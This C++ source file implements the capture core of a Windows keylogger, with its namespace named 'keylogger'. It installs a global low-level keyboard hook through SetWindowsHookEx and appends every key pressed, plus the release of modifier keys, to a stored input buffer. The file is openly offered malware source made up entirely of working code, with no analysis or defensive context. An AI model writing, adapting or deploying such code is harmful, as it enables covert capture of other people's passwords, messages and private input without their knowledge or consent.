#include "KeyboardProcessor.h"

#include "KeyBinding.h"

namespace keylogger
{

HHOOK KeyboardProcessor::hook = nullptr;

void KeyboardProcessor::hookKeyboardProcessing()
{
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProcessor::processKeyboard,
                            GetModuleHandle(nullptr), 0);
}

void KeyboardProcessor::unhookKeyboardProcessing()
{
    UnhookWindowsHookEx(hook);
    hook = nullptr;
}

LRESULT KeyboardProcessor::processKeyboard(int nCode, WPARAM wparam, LPARAM lparam)
{
    if (nCode < 0)
    {
        CallNextHookEx(hook, nCode, wparam, lparam);
    }

    auto* kbs = (KBDLLHOOKSTRUCT*)lparam;
    if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        KeyboardInput::appendToInput(Keys::keys[kbs->vkCode].name);
        if (kbs->vkCode == VK_RETURN)
        {
            KeyboardInput::appendToInput("\n");
        }
    }
    else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        DWORD key = kbs->vkCode;
        if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_SHIFT ||
            key == VK_LSHIFT || key == VK_RSHIFT || key == VK_MENU || key == VK_LMENU || key == VK_RMENU ||
            key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN || key == VK_RWIN)
        {
            std::string keyName = Keys::keys[kbs->vkCode].name;
            keyName.insert(1, "/");
            KeyboardInput::appendToInput(keyName);
        }
    }

    return CallNextHookEx(hook, nCode, wparam, lparam);
}
}
